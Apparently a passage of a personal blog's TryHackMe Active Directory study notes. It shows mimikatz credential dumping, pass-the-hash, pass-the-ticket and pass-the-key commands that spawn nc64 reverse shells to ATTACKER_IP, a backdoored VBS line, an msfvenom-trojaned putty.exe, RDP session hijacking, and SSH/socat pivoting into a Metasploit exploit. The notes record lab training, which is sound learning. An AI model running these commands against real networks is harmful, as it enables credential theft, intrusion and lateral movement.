09:55:02</span><br><span class="line">SID               : S-1-5-21-3330634377-1326264276-632209373-4605</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : bob.jenkins</span><br><span class="line">         * Domain   : ZA</span><br><span class="line">         * NTLM     : 6b4a57f67805a663c818106dc0648484</span><br></pre></td></tr></table></figure></div>
+<p><strong>PtH attack to reverse shell</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># token::revert</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>trying to pass-the-hash with an elevated token won’t work.<br>perform PtH using different protocols:<br><strong>rdp</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH</span><br></pre></td></tr></table></figure></div>
+<p><strong>psexc</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP</span><br></pre></td></tr></table></figure></div>
+<p><strong>winrm</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</span><br></pre></td></tr></table></figure></div>
+<h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><p>pass the ticket<br>Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::tickets /export</span></span><br></pre></td></tr></table></figure></div>
+<p>we prefer TGTs than TGSs but TGTs require administrator’s credentials but TGSs can be done with a low-privileged account<br>Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi</span></span><br></pre></td></tr></table></figure></div>
+<p>To check if the tickets were correctly injected, you can use the klist command:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">za\bob.jenkins@THMJMP2 C:\&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is 0:0x1e43562</span><br><span class="line"></span><br><span class="line">Cached Tickets: (1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: Administrator @ ZA.TRYHACKME.COM</span></span><br><span class="line">        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM</span><br><span class="line">        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">        Start Time: 4/12/2022 0:28:35 (<span class="built_in">local</span>)</span><br><span class="line">        End Time:   4/12/2022 10:28:35 (<span class="built_in">local</span>)</span><br><span class="line">        Renew Time: 4/23/2022 0:28:35 (<span class="built_in">local</span>)</span><br><span class="line">        Session Key Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Cache Flags: 0x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called: THMDC.za.tryhackme.com</span><br></pre></td></tr></table></figure></div>
+<p><strong>Overpass-the-hash &#x2F; Pass-the-Key</strong><br><strong>Pass-the-Key (PtK)</strong> allows attackers to request a valid Kerberos TGT by using only the encryption keys (RC4, AES128, or AES256) derived from a user’s password, completely bypassing the need for the actual plaintext password.<br>We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::ekeys</span></span><br></pre></td></tr></table></figure></div>
+<p>Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (<code>nc64</code> is already available in THMJMP2 for your convenience):<br><strong>If we have the RC4 hash:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>If we have the AES128 hash:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>If we have the AES256 hash:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></pre></td></tr></table></figure></div>
+<h3 id="Abusing-User-Behaviour"><a href="#Abusing-User-Behaviour" class="headerlink" title="Abusing User Behaviour"></a>Abusing User Behaviour</h3><h4 id="Abusing-Writable-Shares"><a href="#Abusing-Writable-Shares" class="headerlink" title="Abusing Writable Shares"></a>Abusing Writable Shares</h4><p>Attackers can exploit writable network shares by backdooring executables or scripts that legitimate users frequently access. When a user runs these compromised files, the malicious payload executes locally on their workstation, granting the attacker access under that user’s privileges.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/70e361f2a43b498e5d487d0394bd0a87.png"></p>
+<h4 id="Backdooring-vbs-Scripts"><a href="#Backdooring-vbs-Scripts" class="headerlink" title="Backdooring .vbs Scripts"></a>Backdooring .vbs Scripts</h4><p>As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;</span>, <span class="number">0</span>, True</span><br></pre></td></tr></table></figure></div>
+<h4 id="Backdooring-exe-Files"><a href="#Backdooring-exe-Files" class="headerlink" title="Backdooring .exe Files"></a>Backdooring .exe Files</h4><p>If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-a</span> x64 <span class="literal">--platform</span> windows <span class="literal">-x</span> putty.exe <span class="literal">-k</span> <span class="literal">-p</span> windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=<span class="number">4444</span> <span class="literal">-b</span> <span class="string">&quot;\x00&quot;</span> <span class="operator">-f</span> exe <span class="literal">-o</span> puttyX.exe</span><br></pre></td></tr></table></figure></div>
+<h4 id="RDP-hijacking"><a href="#RDP-hijacking" class="headerlink" title="RDP hijacking"></a>RDP hijacking</h4><p>Attackers with SYSTEM privileges on Windows Server 2016 and earlier can hijack RDP sessions without a password by using <code>tscon.exe</code> to connect a target user’s session ID to their current session. This allows immediate, password-less access to the victim’s desktop environment by simply remapping the graphical session.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -s cmd.exe</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; query user</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line">&gt;administrator         rdp<span class="literal">-tcp</span><span class="comment">#6           2  Active          .  4/1/2022 4:09 AM</span></span><br><span class="line"> luke                                    <span class="number">3</span>  Disc            .  <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">51</span> AM</span><br></pre></td></tr></table></figure></div>
+ <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /dest:rdp-tcp#6</span><br></pre></td></tr></table></figure></div>
+<h3 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h3><h4 id="SSH-Tunnelling"><a href="#SSH-Tunnelling" class="headerlink" title="SSH Tunnelling"></a>SSH Tunnelling</h4><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd tunneluser -m -d /home/tunneluser -s /bin/true</span><br><span class="line">passwd tunneluser</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@<span class="number">1.1</span>.<span class="number">1.1</span> <span class="literal">-R</span> <span class="number">3389</span>:<span class="number">3.3</span>.<span class="number">3.3</span>:<span class="number">3389</span> <span class="literal">-N</span></span><br></pre></td></tr></table></figure></div>
+<p>This will establish an SSH session from PC-1 to <code>1.1.1.1</code> (Attacker PC) using the <code>tunneluser</code> user.<br>The <code>-R</code> switch is used to request a remote port forward<br>once our tunnel is set and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munra@attacker<span class="literal">-pc</span><span class="variable">$</span> xfreerdp /v:<span class="number">127.0</span>.<span class="number">0.1</span> /u:MyUser /p:MyPassword</span><br></pre></td></tr></table></figure></div>
+<h4 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH Local Port Forwarding"></a>SSH Local Port Forwarding</h4><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N</span><br></pre></td></tr></table></figure></div>
+<p><code>-L</code> option for local port forwarding<br>*:80 表示和PC-1在同一个局域网的其他机器也可以通过访问 PC-1 的 IP 来使用这个隧道。<br>127.0.0.1 是 <strong>Attacker PC 自己</strong><br>Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with <code>dir=in</code>). Administrative privileges are needed for this:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80</span><br></pre></td></tr></table></figure></div>
+<h4 id="Port-Forwarding-With-socat"><a href="#Port-Forwarding-With-socat" class="headerlink" title="Port Forwarding With socat"></a>Port Forwarding With socat</h4><p>In situations where SSH is not available, socat can be used to perform similar functionality.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321</span><br></pre></td></tr></table></figure></div>
+<p>The <code>fork</code> option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;socat TCP4-LISTEN:<span class="number">3389</span>,fork TCP4:<span class="number">3.3.3.3:3389</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Open Port 3389&quot; dir=in action=allow protocol=TCP localport=3389</span><br></pre></td></tr></table></figure></div>
+<p><code>C:\&gt;socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80</code><br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png"></p>
+<h4 id="Dynamic-Port-Forwarding-and-SOCKS"><a href="#Dynamic-Port-Forwarding-and-SOCKS" class="headerlink" title="Dynamic Port Forwarding and SOCKS"></a>Dynamic Port Forwarding and SOCKS</h4><p><strong>Dynamic port forwarding allows attackers to pivot through a compromised host to scan and access multiple ports across various internal machines using a SOCKS proxy.</strong> This is typically established using an SSH client to create a reverse tunnel (e.g., <code>ssh -R</code>), which opens a listening SOCKS proxy port on the attacker’s machine. Finally, tools like <code>proxychains</code> are configured to route local network traffic through this proxy port, enabling the attacker to execute commands against the target network transparently.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@<span class="number">1.1</span>.<span class="number">1.1</span> <span class="literal">-R</span> <span class="number">9050</span> <span class="literal">-N</span></span><br></pre></td></tr></table></figure></div>
+<p>in <code>/etc/proxychains.conf</code> </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks4  127.0.0.1 9050</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://pxeboot.za.tryhackme.com</span><br></pre></td></tr></table></figure></div>
+
+<p>task example:<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/618de3db53e103f3df56ae922f66e879.png" alt="|500"><br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dbbc833670f1a7ed6f76eeac7d8bd1ee.png" alt="|700"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ssh tunneluser@ATTACKER_IP <span class="literal">-R</span> <span class="number">8888</span>:thmdc.za.tryhackme.com:<span class="number">80</span> <span class="literal">-L</span> *:<span class="number">6666</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6666</span> <span class="literal">-L</span> *:<span class="number">7878</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7878</span> <span class="literal">-N</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole</span><br><span class="line">msf6 &gt; use rejetto_hfs_exec</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> payload windows/shell_reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> lhost thmjmp2.za.tryhackme.com</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> ReverseListenerBindAddress 127.0.0.1</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> lport 7878 </span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> srvhost 127.0.0.1</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> srvport 6666</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> rhosts 127.0.0.1</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; <span class="built_in">set</span> rport 8888</span><br><span class="line">msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/6922d5493203f7be0024e779.png"><br>8888端口用来触发漏洞，6666用来投递payload  7878用来发送和接受数据类似 nc -e 和 nc -lvp的端口</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/57685.html" title="tryhackme-AD笔记">https://guayu-kakeru.github.io/posts/57685.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/tryhackme/" rel="tag"># tryhackme</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/30538.html" rel="prev" title="tryhackme-学习笔记">
+      <i class="fa fa-chevron-left"></i> tryhackme-学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/3265.html" rel="next" title="Windows工具">
+      Windows工具 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Active-Directory-Basics"><span class="nav-text">Active Directory Basics</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-domain"><span class="nav-text">Windows domain:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AD"><span class="nav-text">AD:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#managing-users-in-ad"><span class="nav-text">managing users in ad</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Managing-Computers-in-AD"><span class="nav-text">Managing Computers in AD:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group-policies"><span class="nav-text">group policies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Authentication-Methods"><span class="nav-text">Authentication Methods</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerebereos"><span class="nav-text">Kerebereos</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NetNTLM-Authentication"><span class="nav-text">NetNTLM Authentication</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tress-Forests-and-Trusts"><span class="nav-text">Tress,Forests and Trusts</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Compromising-AD"><span class="nav-text">Compromising AD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Breaching-Active-Directory"><span class="nav-text">Breaching Active Directory</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#connect-to-domain"><span class="nav-text">connect to domain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OSINT-and-Phishing"><span class="nav-text">OSINT and Phishing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Authenticated-Services"><span class="nav-text">NTLM Authenticated Services</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP-Bind-Credentials"><span class="nav-text">LDAP Bind Credentials</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LDAP-Pass-back-attack"><span class="nav-text">LDAP Pass-back attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Authentication-Relays"><span class="nav-text">Authentication Relays</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LLMNR-NBT-NS-and-WPAD"><span class="nav-text">LLMNR, NBT-NS, and WPAD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Relaying-the-Challenge"><span class="nav-text">Relaying the Challenge</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Microsoft-Deployment-Toolkit"><span class="nav-text">Microsoft Deployment Toolkit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MDT-and-SCCM"><span class="nav-text">MDT and SCCM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PXE-boot"><span class="nav-text">PXE boot</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Coonfiguration-files"><span class="nav-text">Coonfiguration files</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumerating-Active-Directory"><span class="nav-text">Enumerating Active Directory</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Why-AD-Enumeration"><span class="nav-text">Why AD Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Credenticla-injection"><span class="nav-text">Credenticla injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration-through-Microsoft-Management-Console"><span class="nav-text">Enumeration through Microsoft Management Console</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration-through-Command-Prompt"><span class="nav-text">Enumeration through Command Prompt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration-through-PowerShell"><span class="nav-text">Enumeration through PowerShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration-through-Bloodhound"><span class="nav-text">Enumeration through Bloodhound</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement-and-Pivoting"><span class="nav-text">Lateral Movement and Pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Moving-Through-the-Network"><span class="nav-text">Moving Through the Network</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spawning-Processes-Remotely"><span class="nav-text">Spawning Processes Remotely</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec"><span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Remote-Process-Creation-Using-WinRM"><span class="nav-text">Remote Process Creation Using 